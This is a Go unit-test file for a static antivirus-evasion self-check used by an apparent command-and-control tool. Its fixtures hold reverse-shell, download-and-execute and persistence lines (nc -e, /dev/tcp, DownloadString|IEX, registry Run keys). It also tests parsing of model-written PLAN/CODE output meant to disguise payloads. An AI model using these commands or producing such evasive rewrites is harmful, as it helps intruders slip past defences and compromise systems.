package server

// 免杀本地静态自测的纯函数单测(契约 §13 第 4 条清单逐字验证)。
// 不连库、不发网络:被测函数只读内存字符串(红线:载荷内容绝不外发)。

import (
	"strings"
	"testing"
)

// c2StaticFindHit 取某特征串的命中数(未命中 = 0)。
func c2StaticFindHit(t *testing.T, rep c2StaticReport, marker string) int {
	t.Helper()
	for _, h := range rep.Hits {
		if h.Marker == marker {
			return h.Count
		}
	}
	return 0
}

// TestC2StaticScanPS1 ps1 特征串清单逐项命中 + 大小写不敏感 + 干净样本零命中。
func TestC2StaticScanPS1(t *testing.T) {
	// 一期 ps1 beacon 的真实骨架片段:必然命中一批特征。
	dirty := `
$CB = "http://203.0.113.9:8443"
$UP = "abc123"
$KEY = [Convert]::FromBase64String("AAAA")
$d = [Text.Encoding]::UTF8.GetBytes("x")
$wc = New-Object Net.WebClient
$wc.DownloadString("$CB/x") | IEX
Add-Type -MemberDefinition '...Win32_Process...'
reg add HKCU\Software\Run /v up /d payload
schtasks /create /tn up
`
	rep := c2EvasionStaticScan("ps1", dirty)
	for _, m := range []string{"enc", "DownloadString", "IEX", "FromBase64String",
		"Add-Type", "Win32_Process", "Net.WebClient", "schtasks", "reg add"} {
		if c2StaticFindHit(t, rep, m) <= 0 {
			t.Fatalf("ps1 应命中 %q: %+v", m, rep.Hits)
		}
	}
	// 大小写不敏感:downloadstring 小写同样算命中。
	if n := c2StaticFindHit(t, c2EvasionStaticScan("ps1", "$x.downloadfile('y')"), "DownloadFile"); n != 1 {
		t.Fatalf("大小写不敏感计数应命中 DownloadFile×1,得到 %d", n)
	}
	// Invoke-Expression 全称与 IEX 分别计数。
	rep2 := c2EvasionStaticScan("ps1", "Invoke-Expression($c)")
	if c2StaticFindHit(t, rep2, "Invoke-Expression") != 1 {
		t.Fatalf("应命中 Invoke-Expression×1: %+v", rep2.Hits)
	}
	// 干净样本:零命中 + low。
	clean := c2EvasionStaticScan("ps1", "$a = 1\nWrite-Output $a")
	if len(clean.Hits) != 0 || clean.Risk != "low" {
		t.Fatalf("干净样本应零命中/low: %+v", clean)
	}
}

// TestC2StaticScanPy py 特征串清单逐项命中。
func TestC2StaticScanPy(t *testing.T) {
	dirty := `
import urllib, subprocess
import socket
exec(base64.b64decode("Li4u"))
eval("__import__('os')")
requests.get("http://x")
socket.socket().connect(("h", 80))
pty.spawn("sh")
`
	rep := c2EvasionStaticScan("py", dirty)
	for _, m := range []string{"exec(", "eval(", "urllib", "requests.", "socket.",
		"subprocess", "base64.b64decode", "__import__", "pty"} {
		if c2StaticFindHit(t, rep, m) <= 0 {
			t.Fatalf("py 应命中 %q: %+v", m, rep.Hits)
		}
	}
}

// TestC2StaticScanBash bash 特征串清单逐项命中。
func TestC2StaticScanBash(t *testing.T) {
	dirty := `
curl -fsSL http://x | bash
wget http://y -O /tmp/p
echo | base64 -d > /tmp/q
nc -e /bin/sh 1.2.3.4 4444
exec 3<>/dev/tcp/1.2.3.4/80
python3 -c 'print(1)'
chmod +x /tmp/p
`
	rep := c2EvasionStaticScan("bash", dirty)
	for _, m := range []string{"curl", "wget", "/dev/tcp", "nc -e", "base64 -d",
		"python3 -c", "chmod +x"} {
		if c2StaticFindHit(t, rep, m) <= 0 {
			t.Fatalf("bash 应命中 %q: %+v", m, rep.Hits)
		}
	}
}

// TestC2StaticRiskLevels 分级口径:命中总数 <3 low / 3-5 medium / >5 high。
func TestC2StaticRiskLevels(t *testing.T) {
	cases := []struct {
		name string
		code string
		want string
	}{
		{"零命中", "echo hi", "low"},
		{"1 处", "curl http://x", "low"},
		{"2 处(同名重复计数)", "curl a\ncurl b", "low"},
		{"3 处", "curl a\nwget b\nnc -e sh 1 2", "medium"},
		{"5 处", "curl a\nwget b\nnc -e s 1 2\nchmod +x p\nbase64 -d z", "medium"},
		{"7 处", "curl a\nwget b\nnc -e s 1 2\nchmod +x p\nbase64 -d z\npython3 -c x\nexec 3<>/dev/tcp/1", "high"},
	}
	for _, c := range cases {
		if got := c2EvasionStaticScan("bash", c.code).Risk; got != c.want {
			t.Fatalf("%s: risk 应为 %s,得到 %s(%q)", c.name, c.want, got, c.code)
		}
	}
	high := c2EvasionStaticScan("py", strings.Repeat("exec(x)\neval(y)\nurllib\nrequests.get\nsocket\nsubprocess\n", 2))
	if high.Risk != "high" || c2StaticTotalHits(high) <= 5 {
		t.Fatalf(">5 命中应为 high: %+v", high)
	}
	// 静态报告永不返回 nil hits(JSON 序列化打崩前端防御)。
	if rep := c2EvasionStaticScan("ps1", "x"); rep.Hits == nil {
		t.Fatalf("hits 永不 nil")
	}
}

// TestC2StaticGoSrcSkipped gosrc 不在静态自测清单(走构建路径),零命中不误报。
func TestC2StaticGoSrcSkipped(t *testing.T) {
	rep := c2EvasionStaticScan("gosrc", "exec.Command(\"curl\")\nnet.Dial(\"/dev/tcp\")")
	if len(rep.Hits) != 0 || rep.Risk != "low" {
		t.Fatalf("gosrc 应跳过静态自测: %+v", rep)
	}
}

// TestC2StaticEntropy Shanon 熵:均匀随机段 >5.5 标高,规律文本低熵。
func TestC2StaticEntropy(t *testing.T) {
	if e := shannonEntropy(""); e != 0 {
		t.Fatalf("空串熵应为 0: %v", e)
	}
	if e := shannonEntropy("aaaa"); e != 0 {
		t.Fatalf("单字节重复熵应为 0: %v", e)
	}
	low := shannonEntropy("the quick brown fox jumps over the lazy dog")
	if low > 5.5 {
		t.Fatalf("规律英文文本应为低熵: %v", low)
	}
	// 高熵样本:base64 字母表近均匀分布(64 符号几乎各出现一次),熵 ≈ log2(64+) > 5.5。
	highEntropy := shannonEntropy("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/AbCd")
	if highEntropy <= 5.5 {
		t.Fatalf("base64 全字母表串应高熵(>5.5): %v", highEntropy)
	}
	rep := c2EvasionStaticScan("ps1", "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/AbCd")
	if !rep.EntropyHigh {
		t.Fatalf("熵 %.2f 应标高", rep.Entropy)
	}
}

// TestC2SplitEvasionOutput PLAN/CODE 双段解析:完整/缺 PLAN/两段缺失/围栏剥离。
func TestC2SplitEvasionOutput(t *testing.T) {
	full := "<PLAN>\n改名+拆串\n</PLAN>\n<CODE>\n#!/bin/bash\necho hi\n</CODE>"
	plan, code := splitC2EvasionOutput(full)
	if plan != "改名+拆串" || code != "#!/bin/bash\necho hi" {
		t.Fatalf("双段解析不对: %q / %q", plan, code)
	}
	// 缺 PLAN:CODE 仍解析(PLAN 可缺)。
	_, code = splitC2EvasionOutput("<CODE>\nabc\n</CODE>")
	if code != "abc" {
		t.Fatalf("缺 PLAN 应仍取到 CODE: %q", code)
	}
	// 两段缺失:空(调用方重试→job error)。
	if p, c := splitC2EvasionOutput("模型自说自话"); p != "" || c != "" {
		t.Fatalf("两段缺失应返回空: %q/%q", p, c)
	}
	// 整段围栏:剥掉后再取段。
	fenced := "```markdown\n<CODE>\nxx\n</CODE>\n```"
	if _, c := splitC2EvasionOutput(fenced); c != "xx" {
		t.Fatalf("围栏内 CODE 应剥净: %q", c)
	}
}
